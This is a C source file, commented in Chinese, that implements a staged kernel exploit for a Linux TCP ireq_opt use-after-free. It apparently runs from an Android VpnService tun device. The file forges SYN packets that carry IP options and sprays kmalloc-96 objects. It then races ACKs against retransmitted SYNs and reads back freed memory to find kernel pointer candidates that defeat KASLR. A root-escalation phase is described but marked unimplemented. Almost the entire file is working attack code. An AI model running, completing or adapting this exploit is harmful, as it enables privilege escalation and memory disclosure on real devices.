/*
 * CVE-2026-98432 — ireq_opt use-after-free (6.6.118 / f72a02f47f4b)
 *
 * 输入侧走 VpnService 的 tun：把伪造的 SYN 写进 tun，内核当成本地入站处理，
 * 于是无需 CAP_NET_RAW 也能把带 IP 选项的报文塞进 tcp_v4_save_options()。
 *
 * 漏洞点在握手完成时：请求 sock 的 ireq_opt 被直接交给子 socket，子 socket
 * 销毁时以裸 kfree() 释放；而 SYNACK 重传定时器那条路径在 inet_csk_route_req()
 * 里拿到同一个指针，直到 ip_build_and_send_pkt()/ip_options_build() 末尾才 memcpy。
 * 两次读之间对象被释放并复用 → 读到的 optlen 与 __data 来自别人的对象。
 *
 * 本文件按阶段推进，每阶段都能单独跑，失败不 panic（PANIC_ON_OOPS=y 的机器
 * 上尤其重要）：
 *   probe  —— 只验通道：发 SYN、收 SYNACK、确认选项原样回来
 *   race   —— 边喷淋边打竞态，命中只表现为 SYNACK 选项长度异常
 *   leak   —— 命中后回读选项区，判定复用并挑出内核 .text 指针候选
 *   root   —— 拿 base + cred 指针改写（**尚未实现**，Kotlin 侧默认拒绝）
 *
 * 用法：libsynopt.so --tun-fd 3 --target 10.7.7.1 --port 47777 [--phase race]
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>

#include "synopt_offsets.h"

/* ------------------------------------------------------------------ 日志 */

static int g_verbose;

static void say(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    fflush(stderr);
}

#define FAIL(fmt, ...) do { say("FAIL: " fmt, ##__VA_ARGS__); } while (0)

/* ------------------------------------------------------------------ 参数 */

static int g_tun = -1;
static uint32_t g_dst;
/* 源地址必须落在 tun 子网内：SYNACK 要靠这个网段的路由回到 tun，
 * 否则内核会把回包发到真实网卡，我们读不到。README 里“源不在直连子网”
 * 那条是针对有 raw socket + 嗅探的攻击侧，tun 方案不适用。 */
static uint32_t g_src = 0x0a070763; /* 10.7.7.99 */
static uint16_t g_port = 47777;
static int g_rounds = 4000;

/* ------------------------------------------------------- 收发与环形缓冲 */

struct synack {
    uint16_t sport;
    uint32_t ack;
    uint32_t seq;
    uint8_t optlen;
    uint8_t opts[64];
};

#define RING 256
static struct synack g_ring[RING];
static volatile unsigned g_head, g_tail;
static pthread_mutex_t g_ring_lock = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_running = 1;
static volatile unsigned long g_tx, g_rx, g_synack, g_hit, g_clear, g_none;

static uint16_t csum(const void *data, size_t len, uint32_t init) {
    const uint16_t *p = data;
    uint32_t s = init;
    while (len > 1) { s += *p++; len -= 2; }
    if (len) s += *(const uint8_t *)p;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}

/* 40 字节 RR 选项：len=39 + 末尾 NOP；第 3 字节起是 4 字节标记 */
static void build_opts(uint8_t *o, uint32_t tag) {
    memset(o, 1, OPT_MAXLEN);
    o[0] = 7;
    o[1] = OPT_MAXLEN - 1;
    o[2] = 4;
    o[3] = (uint8_t)(tag >> 24);
    o[4] = (uint8_t)(tag >> 16);
    o[5] = (uint8_t)(tag >> 8);
    o[6] = (uint8_t)tag;
}

static size_t build_pkt(uint8_t *buf, uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags) {
    uint8_t opts[OPT_MAXLEN];
    build_opts(opts, 0x52550000u | (seq & 0xffff));

    size_t ihl = 20 + OPT_MAXLEN, total = ihl + 20;
    memset(buf, 0, total);
    buf[0] = (uint8_t)(0x40 | (ihl / 4));
    buf[1] = 0;
    *(uint16_t *)(buf + 2) = htons((uint16_t)total);
    *(uint16_t *)(buf + 4) = (uint16_t)(0x4000 + (seq & 0x3fff));
    buf[8] = 64;
    buf[9] = 6;
    *(uint32_t *)(buf + 12) = g_src;
    *(uint32_t *)(buf + 16) = g_dst;
    memcpy(buf + 20, opts, OPT_MAXLEN);
    *(uint16_t *)(buf + 10) = csum(buf, 20 + OPT_MAXLEN, 0);

    uint8_t *tcp = buf + ihl;
    *(uint16_t *)(tcp + 0) = htons(sport);
    *(uint16_t *)(tcp + 2) = htons(g_port);
    *(uint32_t *)(tcp + 4) = htonl(seq);
    *(uint32_t *)(tcp + 8) = htonl(ack);
    tcp[12] = 5 << 4;
    tcp[13] = flags;
    *(uint16_t *)(tcp + 14) = htons(0xffff);
    uint32_t pseudo = 0;
    uint8_t ph[12];
    memcpy(ph, &g_src, 4);
    memcpy(ph + 4, &g_dst, 4);
    ph[8] = 0;
    ph[9] = 6;
    *(uint16_t *)(ph + 10) = htons(20);
    pseudo = csum(ph, 12, 0);
    *(uint16_t *)(tcp + 16) = csum(tcp, 20, pseudo);
    return total;
}

static void tx(const uint8_t *pkt, size_t len) {
    if (write(g_tun, pkt, len) > 0) g_tx++;
}

static void push(const struct synack *s) {
    unsigned next = (g_head + 1) % RING;
    if (next == g_tail) return;
    g_ring[g_head] = *s;
    g_head = next;
}

static int pop(struct synack *out) {
    if (g_tail == g_head) return 0;
    *out = g_ring[g_tail];
    g_tail = (g_tail + 1) % RING;
    return 1;
}

static void *reader(void *arg) {
    (void)arg;
    static uint8_t buf[2048];
    while (g_running) {
        ssize_t n = read(g_tun, buf, sizeof(buf));
        if (n <= 0) {
            if (n < 0 && (errno == EAGAIN || errno == EINTR)) continue;
            if (n == 0) break;
            continue;
        }
        if (n < 20) continue;
        size_t ihl = (buf[0] & 0x0f) * 4;
        if ((buf[0] >> 4) != 4 || buf[9] != 6 || (size_t)n < ihl + 20) continue;
        if (*(uint32_t *)(buf + 16) != g_src) continue;
        const uint8_t *tcp = buf + ihl;
        uint16_t sport = ntohs(*(uint16_t *)(tcp + 0));
        uint16_t dport = ntohs(*(uint16_t *)(tcp + 2));
        uint8_t flags = tcp[13];
        if (dport != g_port) continue;
        if ((flags & 0x12) != 0x12) continue; /* SYN+ACK */
        g_rx++;
        struct synack s;
        memset(&s, 0, sizeof(s));
        s.sport = sport;
        s.seq = ntohl(*(uint32_t *)(tcp + 4));
        s.ack = ntohl(*(uint32_t *)(tcp + 8));
        size_t tcp_hdr = (tcp[12] >> 4) * 4;
        size_t optlen = ihl - 20;
        if (optlen > sizeof(s.opts)) optlen = sizeof(s.opts);
        s.optlen = (uint8_t)optlen;
        if (optlen) memcpy(s.opts, buf + 20, optlen);
        (void)tcp_hdr;
        pthread_mutex_lock(&g_ring_lock);
        push(&s);
        pthread_mutex_unlock(&g_ring_lock);
    }
    return NULL;
}

/* ------------------------------------------------------------ 喷射 */

/* 用 IP_OPTIONS 把 kmalloc-96 填成可控对象：每条选项前 4 字节是标记，
 * 选项整体照抄了 40 字节，所以复用发生后 SYNACK 会把我们的标记送回来。 */
#define SPRAY_SOCKS 192
static int g_spray[SPRAY_SOCKS];
static int g_spray_n;
static volatile int g_spray_run;
static pthread_t g_spray_thread;

/* 标记里的“代”：喷射线程每轮 +1，回读时能看出对象是哪一代的。 */
static volatile uint32_t g_spray_gen;

static int spray_alloc(uint32_t tag) {
    uint8_t opts[OPT_MAXLEN];
    memset(opts, 0, sizeof(opts));
    build_opts(opts, tag);
    int made = 0;
    for (int i = 0; i < SPRAY_SOCKS; i++) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) break;
        if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, OPT_MAXLEN) < 0) {
            close(fd);
            continue;
        }
        g_spray[g_spray_n++] = fd;
        made++;
    }
    return made;
}

static void spray_free(void) {
    for (int i = 0; i < g_spray_n; i++) close(g_spray[i]);
    g_spray_n = 0;
}

/* 持续占位。
 *
 * 单发一次喷淋几乎不可能命中：被释放的槽位必须在 ip_build_and_send_pkt
 * 真正拷贝之前就被占住，中间只有微秒级窗口。所以竞态期间开一个线程不停
 * 地“关掉一批 → 重新分配一批”，让 kmalloc-96 一直有我们的对象进出。 */
static void *spray_worker(void *arg) {
    (void)arg;
    while (g_spray_run) {
        uint32_t gen = ++g_spray_gen;
        spray_free();
        spray_alloc(0x53500000u | (gen & 0xffff));
        usleep(200);
    }
    spray_free();
    return NULL;
}

static void spray_start(void) {
    if (g_spray_run) return;
    g_spray_run = 1;
    pthread_create(&g_spray_thread, NULL, spray_worker, NULL);
}

static void spray_stop(void) {
    if (!g_spray_run) return;
    g_spray_run = 0;
    pthread_join(g_spray_thread, NULL);
}

/* ------------------------------------------------------------ 单次请求 */

/* 发一个 SYN，等它的 SYNACK；返回 1 拿到、0 没有。 */
static int syn_round(uint16_t *sport_out, uint32_t *seq_out, struct synack *out) {
    uint8_t pkt[128];
    uint16_t sport = (uint16_t)(20000 + (rand() % 40000));
    uint32_t isn = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
    size_t len = build_pkt(pkt, sport, isn, 0, 0x02);
    tx(pkt, len);

    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;) {
        pthread_mutex_lock(&g_ring_lock);
        struct synack s;
        int got = pop(&s);
        pthread_mutex_unlock(&g_ring_lock);
        if (got && s.sport == sport && s.ack == isn + 1) {
            *sport_out = sport;
            *seq_out = isn;
            *out = s;
            return 1;
        }
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long ms = (now.tv_sec - t0.tv_sec) * 1000 + (now.tv_nsec - t0.tv_nsec) / 1000000;
        if (ms > 200) return 0;
        usleep(200);
    }
}

/* 完成握手：ACK；随后 RST 让子 socket 销毁、触发 kfree。 */
static void complete(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    uint8_t pkt[128];
    size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
    tx(pkt, len);
    len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x04);
    tx(pkt, len);
}

/* 只发 ACK，不发 RST。
 *
 * leak 阶段不能用 [complete]：RST 会走 inet_sock_destruct，把子 socket 的
 * inet_opt 再 kfree 一次；如果那时它指向的已经是我们的喷射对象，就是一次
 * double free —— 这台机器 CONFIG_PANIC_ON_OOPS=y，直接重启。 */
static void complete_ack_only(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    uint8_t pkt[128];
    size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
    tx(pkt, len);
}

/* 竞态的两半：重传 SYN（走定时器/重传那条读路径）与 ACK（把 ireq_opt 交给
 * 子 socket 并置空）。两边必须落在不同 CPU 上，所以用屏障对齐后各写一次 tun。 */
struct pair_arg {
    uint8_t rtx[128], ack[128];
    size_t rtx_len, ack_len;
    pthread_barrier_t *bar;
};

static void *pair_thread(void *p) {
    struct pair_arg *a = p;
    pthread_barrier_wait(a->bar);
    tx(a->rtx, a->rtx_len);
    tx(a->ack, a->ack_len);
    return NULL;
}

static void fire_pair(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    struct pair_arg a;
    pthread_barrier_t bar;
    pthread_barrier_init(&bar, NULL, 3);
    a.bar = &bar;
    a.rtx_len = build_pkt(a.rtx, sport, isn, 0, 0x02);
    a.ack_len = build_pkt(a.ack, sport, isn + 1, peer_seq + 1, 0x10);
    pthread_t t1, t2;
    pthread_create(&t1, NULL, pair_thread, &a);
    pthread_create(&t2, NULL, pair_thread, &a);
    pthread_barrier_wait(&bar);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_barrier_destroy(&bar);
}

/* ------------------------------------------------------------ 主流程 */

static int phase_probe(void) {
    for (int i = 0; i < 5; i++) {
        uint16_t sport;
        uint32_t isn;
        struct synack s;
        if (!syn_round(&sport, &isn, &s)) { say("probe %d: 没收到 SYNACK", i); continue; }
        if (s.optlen != OPT_MAXLEN) {
            say("probe %d: 选项长度 %u（预期 %u）", i, s.optlen, OPT_MAXLEN);
            continue;
        }
        say("probe %d: 选项 %u 字节原样返回，标记 %02x%02x", i, s.optlen, s.opts[3], s.opts[4]);
        complete(sport, isn, s.seq);
        return 0;
    }
    return 1;
}

struct hit_ctx {
    uint16_t sport;
    uint32_t isn;
    struct synack s;
};

/* ------------------------------------------------------ 泄露解析 */

/* 喷射对象里我们写死的标记：build_opts 把 tag 放在 opts[3..6]。
 * 复用发生后，SYNACK 的选项区就是这份数据的拷贝，所以看 opts[3..6] 即可。 */
#define SPRAY_TAG0 0x53

static int is_spray_tag(const struct synack *s) {
    return s->optlen >= 7 && s->opts[3] == SPRAY_TAG0;
}

/* 把回读到的选项区按 8 字节一组打印，方便人工判断是残留堆还是我们的对象。 */
static void dump_opts(const struct synack *s) {
    char line[192];
    int off = 0;
    off += snprintf(line + off, sizeof(line) - off, "  opts[%u]:", s->optlen);
    for (int i = 0; i < s->optlen && i < 48; i++) {
        off += snprintf(line + off, sizeof(line) - off, " %02x", s->opts[i]);
        if ((i + 1) % 16 == 0 && i + 1 < s->optlen) {
            say("%s", line);
            off = snprintf(line, sizeof(line), "           ");
        }
    }
    if (off > 0) say("%s", line);
}

/* 从回读数据里挑出像内核 .text 指针的 8 字节（KASLR 基址候选）。
 *
 * 只做“看起来像”的判断：aarch64 内核线性映射在 0xffff8... 到 0xffffc...
 * 之间，且低 12 位通常是页对齐。真正的基址换算要靠 offsets 表。 */
static int find_text_candidates(const struct synack *s, uint64_t *out, int max) {
    int n = 0;
    for (int i = 0; i + 8 <= s->optlen && n < max; i += 8) {
        uint64_t v = 0;
        memcpy(&v, s->opts + i, 8);
        if ((v >> 48) != 0xffff) continue;
        if ((v & 0xfff) != 0) continue;
        out[n++] = v;
    }
    return n;
}

/* 竞态：一边持续喷淋占位，一边把 ACK 与重传 SYN 对撞。
 *
 * 顺序很重要 —— 必须在喷淋已经跑起来之后再放 ACK，否则释放出来的槽位
 * 还是空的，回读到的是残留堆（或者根本读不到）。 */
static int phase_race(struct hit_ctx *hit) {
    int found = 0;
    say("开始竞态：喷淋 %d 个对象/轮，最多 %d 轮", SPRAY_SOCKS, g_rounds);
    spray_start();
    for (int r = 0; r < g_rounds && !found; r++) {
        uint16_t sport;
        uint32_t isn;
        struct synack s;
        if (!syn_round(&sport, &isn, &s)) { g_none++; continue; }
        g_synack++;
        if (s.optlen == 0) {
            g_clear++;
        } else if (s.optlen != OPT_MAXLEN) {
            g_hit++;
            say("命中 r=%d optlen=%u gen=%u", r, s.optlen, g_spray_gen);
            dump_opts(&s);
            hit->sport = sport;
            hit->isn = isn;
            hit->s = s;
            found = 1;
            break;
        }
        /* 把同步 ACK 与重传 SYN 对撞：ACK 让 ireq_opt 交给子 socket，
         * 重传 SYN 走 tcp_v4_send_synack 那条读路径。 */
        fire_pair(sport, isn, s.seq);
        usleep(1500);
        if (g_verbose && (r % 100) == 0)
            say("r=%d synack=%lu hit=%lu clear=%lu none=%lu spray_gen=%u",
                r, g_synack, g_hit, g_clear, g_none, g_spray_gen);
    }
    if (!found) spray_stop();
    return found ? 0 : 1;
}

/* 泄露：命中后对象已在子 socket 的 inet_opt 里（或被喷淋对象复用）。
 * 只发 ACK 不发 RST，避免 inet_sock_destruct 再 kfree 一次。 */
static int phase_leak(struct hit_ctx *hit) {
    complete_ack_only(hit->sport, hit->isn, hit->s.seq);
    say("回读命中对象：");
    dump_opts(&hit->s);

    uint64_t cand[8];
    int n = find_text_candidates(&hit->s, cand, 8);
    if (is_spray_tag(&hit->s)) {
        say("对象已被喷淋占据（标记 0x%02x），说明复用成功", SPRAY_TAG0);
        say("但内容是我们自己写的，没有泄露价值；需要靠残留堆读内核指针");
        spray_stop();
        return 1;
    }
    if (n > 0) {
        for (int i = 0; i < n; i++) say("  内核指针候选[%d] = %#llx", i, (unsigned long long)cand[i]);
        spray_stop();
        return 0;
    }
    say("没有挑出内核指针候选（optlen=%u）", hit->s.optlen);
    spray_stop();
    return 1;
}

int main(int argc, char **argv) {
    const char *phase = "race";
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--tun-fd") && i + 1 < argc) g_tun = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--target") && i + 1 < argc) g_dst = inet_addr(argv[++i]);
        else if (!strcmp(argv[i], "--src") && i + 1 < argc) g_src = inet_addr(argv[++i]);
        else if (!strcmp(argv[i], "--port") && i + 1 < argc) g_port = (uint16_t)atoi(argv[++i]);
        else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) g_rounds = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--phase") && i + 1 < argc) phase = argv[++i];
        else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
    }

    srand((unsigned)time(NULL) ^ (unsigned)getpid());
    if (g_tun < 0) { FAIL("缺少 --tun-fd"); return 2; }
    say("synopt: release=%s tun=%d dst=%08x port=%u phase=%s", SYNOPT_RELEASE, g_tun, g_dst, g_port, phase);

    pthread_t th;
    if (pthread_create(&th, NULL, reader, NULL) != 0) { FAIL("读线程起不来"); return 2; }

    int rc;
    if (!strcmp(phase, "probe")) {
        rc = phase_probe();
    } else {
        struct hit_ctx hit;
        rc = phase_race(&hit);
        if (rc == 0 && !strcmp(phase, "leak")) {
            rc = phase_leak(&hit);
        }
    }

    say("统计: tx=%lu synack=%lu hit=%lu clear=%lu none=%lu", g_tx, g_synack, g_hit, g_clear, g_none);
    g_running = 0;
    pthread_join(th, NULL);
    if (rc == 0) say("OK");
    return rc;
}
